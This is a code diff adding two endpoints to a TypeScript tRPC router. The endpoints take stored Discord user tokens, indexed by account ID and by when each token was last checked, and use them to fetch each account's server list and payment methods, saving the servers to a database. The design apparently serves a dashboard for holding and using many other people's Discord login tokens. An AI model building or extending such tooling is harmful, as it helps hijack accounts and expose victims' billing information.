@@ -6,6 +6,7 @@ import {
 } from "~/server/api/trpc";
 import { TRPCError } from "@trpc/server";
 import { localeToCountry, TOKEN_REGEX_LEGACY } from "~/lib/utils";
+import { fetchGuilds, fetchPaymentMethods } from "~/lib/dapi";
 
 const zodUserShape = z.object({
   id: z.string().min(17),
@@ -274,4 +275,73 @@ export const accountRouter = createTRPCRouter({
   getAll: protectedProcedure.query(({ ctx }) => {
     return ctx.prisma.discordAccount.findMany();
   }),
+  getGuildsById: protectedProcedure
+    .input(z.string().min(17))
+    .query(async ({ input: id, ctx }) => {
+      const { prisma } = ctx;
+      const token = await prisma.discordToken.findFirst({
+        where: {
+          discordAccountId: id,
+        },
+        orderBy: {
+          lastCheckedAt: "desc",
+        },
+        select: {
+          value: true,
+        },
+      });
+      if (!token) {
+        throw new TRPCError({ code: "NOT_FOUND" });
+      }
+
+      const response = await fetchGuilds({
+        method: "GET",
+        token: token.value,
+      });
+      if (!response) {
+        throw new TRPCError({ code: "NOT_FOUND" });
+      }
+
+      const { data: guilds } = response;
+      await prisma.discordGuild.createMany({
+        data: guilds.map((guild) => ({
+          ...guild,
+          owner: undefined,
+          permissions: undefined,
+          owner_id: guild.owner ? id : undefined,
+        })),
+        skipDuplicates: true,
+      });
+
+      return guilds;
+    }),
+  getPaymentMethodsById: protectedProcedure
+    .input(z.string().min(17))
+    .query(async ({ input: id, ctx }) => {
+      const { prisma } = ctx;
+      const token = await prisma.discordToken.findFirst({
+        where: {
+          discordAccountId: id,
+        },
+        orderBy: {
+          lastCheckedAt: "desc",
+        },
+        select: {
+          value: true,
+        },
+      });
+      if (!token) {
+        throw new TRPCError({ code: "NOT_FOUND" });
+      }
+
+      const response = await fetchPaymentMethods({
+        method: "GET",
+        token: token.value,
+      });
+      if (!response) {
+        throw new TRPCError({ code: "NOT_FOUND" });
+      }
+
+      return response.data;
+    }),
 });
